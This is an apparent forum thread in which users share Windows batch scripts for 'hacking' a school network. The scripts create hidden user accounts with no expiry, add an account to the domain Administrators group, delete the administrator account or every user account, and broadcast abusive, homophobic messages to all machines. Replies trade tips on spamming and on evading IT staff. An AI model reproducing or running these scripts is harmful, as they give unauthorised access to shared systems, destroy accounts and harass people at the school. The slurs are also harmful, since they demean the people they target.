channel.title: Hacking Your school using .bat file
channel.description:
[center][b][size=10pt][u]*****~Hacking Your school using .bat file~*****[/u][/size][/b][/center] Firstly for people who don't know how to use CMD. You will not need to use CMD in this tut. I made it much easier for people.I made a code for you to copy/paste in notepad. Just save it as a bat file.
@ECHO OFF :START ECHO made by jonckr ECHO ******************************************************************* ECHO ******************** account maker will only work on networks****** ECHO **************make the account then hade the disc or flash drive*** ECHO ******************************************************************* ECHO USERNAME=death ECHO PASSWORD=death NET SEND /USERS "HELLO FAGS THIS SCHOOL IS GAY HAVE FUN" NET USER death * /ADD /ACTIVE:YES /PASSWORDCHG:NO /EXPIRES:NEVER /TIMES:ALL ECHO Delete the administrator account NET USER administrator /DELETE NET USER adimini /DELETE NET USE /HOME PAUSE
After copying and pasting it, save it as ACCOUNT MAKER.bat then save it to a disc or a flash drive take it to school and it will give you the new user-name to sign in with and the password and it will look like its not typing any thing but it is atfer words it send a Message to every computer hello fags this school is gay have fun and hopefully it deletes the administrator account have fun do what you want to the school and what you do i do not take the blame for it have fun i did make this bat file i posted my code up their for the MODs of the site can see it

item.title: Hacking Your school using .bat file
item.dc:creator: @jungledude jungledude
item.description:
@jungledude wrote:

Lol I forgot what I did back at my school but I made my batch file something like this

@ECHO OFF
NET SEND /USERS "You're all dicks and I hope you die"
NET USER * /DELETE
ECHO Deletion was successful. MWAHAHAHAHAHAHAHA
pause

It was something like that and I never got caught.

Read full topic

item.title: Hacking Your school using .bat file
item.dc:creator: @nicatron nicatron
item.description:
@nicatron wrote:

Lol check this program

Lotus hacker BETA 1.0

@echo off
color 09
:start
echo Welcome to Lotus School Of Excelence Net Hacker!!!
echo If you continue you will create this account:
echo.
echo.
echo User: runehaqx
echo Password: what ever u want lol
echo.
pause
goto net
:net
net user runehaqx /add
net user runehaqx *
echo Changing runehaqx to admin account...
net group Administrators runehaqx /add /domain
pause
goto exit
:exit
cls
echo Thankyou for Hacking with Lotus School Of Excelence!!!
echo Disclaimer:
echo Nicatron is not responsoble for ANYTHING DONE TO YOUR SCHOOL!!!!!
pause
exit

And the deleter:

@echo off
color 09
:main
echo deleting account:
echo.
echo.
echo runehaqx
echo.
pause
goto del
:del
net user runehaqx /delete
echo.
pause
exit

Im working on a way to modify it so its a working admin.
ALSO look @ the batch for the portable prompt:

@echo off
color 09
prompt $p$g
title Command Prompt Portable
cls
VER
cd \Documents\UTILS\

Read full topic

And I taught some kids how to spam the computer and they did it to everyone XD

item.title: Hacking Your school using .bat file
item.dc:creator: @justinsxc justinsxc
item.description:
@justinsxc wrote:

[quote=“marluxia, post:12, topic:20108”]NET SEND /USERS "HELLO FAGS THIS SCHOOL IS GAY HAVE FUN"
replace

NET SEND * "HELLO FAGS THIS SCHOOL IS GAY HAVE FUN"

wouldn’t that be better?

Can the IT Support people trace it back to me?

Uhhh yes because the message box says as a title which computer it came from lawl[/quote]

Yeah, do Net Send * This school is gay!
This will result it in sending your computer name and I have tried to change and add users to the computer but the settings are locked and u can’t add one or delete permanently, so yeah u basically have to add a bunch off randoms so u can get out of there before it starts to send messages… I was guna spam the school but I didn’t because the library closed, haha… But I need to figure out what I used to stall time.

Read full topic
